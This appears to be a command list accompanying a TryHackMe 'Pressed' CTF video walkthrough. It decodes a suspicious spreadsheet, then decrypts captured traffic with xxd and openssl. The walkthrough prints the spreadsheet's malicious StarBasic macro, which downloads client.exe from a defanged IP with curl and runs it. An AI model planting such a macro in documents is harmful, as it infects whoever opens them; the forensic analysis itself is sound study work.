## TryHackMe room Pressed https://tryhackme.com/room/pressedroom

### TryHackMe Pressed YouTube Video Walk Through: 

[TryHackMe Pressed Full Walkthrough 2025](#)

**Below commands used on TryHackMe room Pressed YouTube video walk through:**

```
cat sheet.txt | base64 -d > sheet.ods
```
```
unzip sheet.ods
cat Basic/Standard/evil.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="evil" script:language="StarBasic" script:moduleType="normal">Sub Main

    Shell(&quot;cmd /c curl 10[.]13[.]44[.]207/client.exe -o C:\ProgramData\client.exe&quot;)
    Shell(&quot;cmd /c echo VEhN******F5Xw==&quot;)
    Shell(&quot;C:\\ProgramData\\client.exe&quot;)
```

convert text to hex:

```
echo -n 'rhI1Yaz****Ivl8ps6MJj' | xxd -p
```

Using openssl to decrypt aes

```
openssl enc -aes-256-cbc -d -K 726849315961******149766c387073364d4a6a -iv 70457738****34736a -in cmd.bin -out cmd.txt
```

![Ghidra Main Function Showcasing the Key](https://github.com/djalilayed/tryhackme/blob/main/Pressed/Ghidra_main.png)
